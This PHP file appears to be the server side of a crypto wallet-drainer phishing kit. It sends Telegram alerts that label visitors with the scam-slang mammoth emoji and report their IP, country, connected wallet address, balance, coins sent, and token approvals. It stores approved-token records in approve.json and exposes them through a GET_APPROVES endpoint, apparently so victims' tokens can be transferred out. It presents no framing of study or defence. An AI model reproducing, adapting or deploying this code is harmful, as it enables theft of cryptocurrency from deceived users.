<?PHP

define('BOT_TOKEN', 'There s a bot token');
define('CHAT_ID', 'It s got its own chat id');

function decbin32($dec)
{
    return str_pad(decbin($dec), 32, '0', STR_PAD_LEFT);
}

function ip_in_range($ip, $range)
{
    if (strpos($range, '/') !== false) {
        list($range, $netmask) = explode('/', $range, 2);
        if (strpos($netmask, '.') !== false) {
            $netmask = str_replace('*', '0', $netmask);
            $netmask_dec = ip2long($netmask);
            return ((ip2long($ip) & $netmask_dec) == (ip2long($range) & $netmask_dec));
        } else {
            $x = explode('.', $range);
            while (count($x) < 4) {
                $x[] = '0';
            }
            list($a, $b, $c, $d) = $x;
            $range = sprintf("%u.%u.%u.%u", empty($a) ? '0' : $a, empty($b) ? '0' : $b, empty($c) ? '0' : $c, empty($d) ? '0' : $d);
            $range_dec = ip2long($range);
            $ip_dec = ip2long($ip);
            $wildcard_dec = pow(2, (32 - $netmask)) - 1;
            $netmask_dec = ~$wildcard_dec;
            return (($ip_dec & $netmask_dec) == ($range_dec & $netmask_dec));
        }
    } else {
        if (strpos($range, '*') !== false) {
            $lower = str_replace('*', '0', $range);
            $upper = str_replace('*', '255', $range);
            $range = "$lower-$upper";
        }
        if (strpos($range, '-') !== false) {
            list($lower, $upper) = explode('-', $range, 2);
            $lower_dec = (float)sprintf("%u", ip2long($lower));
            $upper_dec = (float)sprintf("%u", ip2long($upper));
            $ip_dec = (float)sprintf("%u", ip2long($ip));
            return (($ip_dec >= $lower_dec) && ($ip_dec <= $upper_dec));
        }
        return false;
    }
}

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $cf_ip_ranges = [
        '204.93.240.0/24',
        '204.93.177.0/24',
        '199.27.128.0/21',
        '173.245.48.0/20',
        '103.21.244.0/22',
        '103.22.200.0/22',
        '103.31.4.0/22',
        '141.101.64.0/18',
        '108.162.192.0/18',
        '190.93.240.0/20',
        '188.114.96.0/20',
        '197.234.240.0/22',
        '198.41.128.0/17',
        '162.158.0.0/15'
    ];
    foreach ($cf_ip_ranges as $range) {
        if (ip_in_range($_SERVER['REMOTE_ADDR'], $range)) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            break;
        }
    }
}

function getCountryFromIP($address)
{
    $ch = curl_init("http://ip-api.com/json/$address");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $response = json_decode($response, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        return $response['status'] == 'success' ? $response['countryCode'] : 'UNK';
    } else {
        return 'UNK';
    }
}

function sendTelegramMessage($message)
{
    $ch = curl_init('https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage');
    $options = ['parse_mode' => 'HTML', 'chat_id' => CHAT_ID, 'text' => $message, 'disable_web_page_preview' => true];
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $options);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

if (isset($_POST['method']) && $_POST['method'] == 'ENTER_WEBSITE') {
    $USER_IP = $_SERVER['REMOTE_ADDR'];
    $USER_COUNTRY = getCountryFromIP($USER_IP);
    $text = "<b>🦣 New user</b>\n\n<b>💠 ID:</b> $_POST[user_id]\n<b>🌀 IP:</b> $USER_IP\n<b>🌐 Country:</b> $USER_COUNTRY";
    sendTelegramMessage($text);

} elseif (isset($_POST['method']) && $_POST['method'] == 'CONNECT_WALLET') {
    if ($_POST['chain_id'] == 1) {
        $currency = 'ETH';
        $network = 'Ethereum';
    } elseif ($_POST['chain_id'] == 56) {
        $currency = 'BNB';
        $network = 'Binance Smart Chain';
    } elseif ($_POST['chain_id'] == 137) {
        $currency = 'MATIC';
        $network = 'Polygon';
    }
	elseif ($_POST['chain_id'] == 43114) {
        $currency = 'AVAX';
        $network = 'Avalanche';
    }
    elseif ($_POST['chain_id'] == 42161) {
        $currency = 'ETH';
        $network = 'Arbitrum';
    }
    elseif ($_POST['chain_id'] == 10) {
        $currency = 'ETH';
        $network = 'Optimism';
    }
    $text = "<b>💵 User connected wallet</b>\n\n<b>💠 ID:</b> $_POST[user_id]\n<b>💰 Wallet address:</b> <code>$_POST[address]</code>\n<b>⚙️ Network:</b> $network\n<b>💸 Wallet balance:</b> $_POST[amount] $currency";
    sendTelegramMessage($text);

} elseif (isset($_POST['method']) && $_POST['method'] == 'SEND_ETHEREUM') {
    $currency = $_POST['chain_id'] == 1 ? 'ETH' : ($_POST['chain_id'] == 56 ? 'BNB' : 'MATIC');
    $network = $_POST['chain_id'] == 1 ? 'Ethereum' : ($_POST['chain_id'] == 56 ? 'Binance Smart Chain' : 'Polygon');
    $text = "<b>✅ A coin was sent</b>\n\n<b>💠 ID:</b> $_POST[user_id]\n<b>⚙️ Network:</b> $network\n💸 $_POST[amount] $currency";
    sendTelegramMessage($text);

} elseif (isset($_POST['method']) && $_POST['method'] == 'APPROVE_TOKEN') {
    $network = '';
    if ($_POST['chain_id'] == 1) {
        $network = 'Ethereum';
    } elseif ($_POST['chain_id'] == 56) {
        $network = 'Binance Smart Chain';
    } elseif ($_POST['chain_id'] == 137) {
        $network = 'Polygon';
    }
	elseif ($_POST['chain_id'] == 43114) {
        $network = 'Avalanche';
    }
    elseif ($_POST['chain_id'] == 42161) {
        $network = 'Arbitrum';
    }
    elseif ($_POST['chain_id'] == 10) {
        $network = 'Optimism';
    }
    $text = "<b>✅ Token confirmation</b>\n\n<b>💠 ID:</b> $_POST[user_id]\n<b>⚙️ Network:</b> $network"
        . "\n💸 $_POST[amount] $_POST[token_name] ($_POST[usd_amount]$)";
    sendTelegramMessage($text);

    $approves = json_decode(file_get_contents('approve.json'), true);
    array_push($approves, [
        'address'       => $_POST['address'],
        'processor'     => $_POST['processor_address'],
        'token_name'    => $_POST['token_name'],
        'token_amount'  => $_POST['token_amount'],
        'token_address' => $_POST['token_address'],
        'chain_id'      => $_POST['chain_id'],
        'usd_amount'    => $_POST['usd_amount'],
        'amount'        => $_POST['amount'],
        'user_id'       => $_POST['user_id']
    ]);
    file_put_contents('approve.json', json_encode($approves));

} elseif (isset($_POST['method']) && $_POST['method'] == 'NO_APPROVE_TOKEN') {
    if ($_POST['chain_id'] == 1) {
        $network = 'Ethereum';
    } elseif ($_POST['chain_id'] == 56) {
        $network = 'Binance Smart Chain';
    } elseif ($_POST['chain_id'] == 137) {
        $network = 'Polygon';
    }
	elseif ($_POST['chain_id'] == 43114) {
        $network = 'Avalanche';
    }
    elseif ($_POST['chain_id'] == 42161) {
        $network = 'Arbitrum';
    }
    elseif ($_POST['chain_id'] == 10) {
        $network = 'Optimism';
    }
    $text = "<b>❌ Confirmation rejected</b>\n\n<b>💠 ID:</b> $_POST[user_id]\n<b>⚙️ Network:</b> $network"
        . "\n💸 $_POST[amount] $_POST[token_name] ($_POST[usd_amount]$)";
    sendTelegramMessage($text);

} elseif (isset($_GET['method']) && $_GET['method'] == 'GET_APPROVES') {
    $approves = json_decode(file_get_contents('approve.json'), true);
    file_put_contents('approve.json', '[]');
    exit(json_encode($approves));
} elseif (isset($_GET['method']) && $_GET['method'] == 'SEND_TOKEN') {
    if ($_GET['chain_id'] == '1') {
        $link = 'https://etherscan.io/tx/' . $_GET['hash'];
        $network = 'Ethereum';
    } elseif ($_GET['chain_id'] == '56') {
        $link = 'https://bscscan.com/tx/' . $_GET['hash'];
        $network = 'Binance Smart Chain';
    } elseif ($_GET['chain_id'] == '137') {
        $link = 'https://polygonscan.com/tx/' . $_GET['hash'];
        $network = 'Polygon';
    }
	elseif ($_GET['chain_id'] == '43114') {
        $link = 'https://snowtrace.io/tx/' . $_GET['hash'];
        $network = 'Avalanche';
    }
    elseif ($_GET['chain_id'] == '42161') {
        $link = 'https://explorer.arbitrum.io/tx/' . $_GET['hash'];
        $network = 'Arbitrum';
    }
    elseif ($_GET['chain_id'] == '10') {
        $link = 'https://optimistic.etherscan.io/tx/' . $_GET['hash'];
        $network = 'Optimism';
    }
    $text = "<b>✅ Token sent</b>\n\n<b>💠 ID:</b> $_GET[user_id]\n<b>⚙️ Network:</b> $network"
        . "\n💸 $_GET[amount] $_GET[token_name] ($_GET[usd_amount]$)\n\n$link";
    sendTelegramMessage($text);
}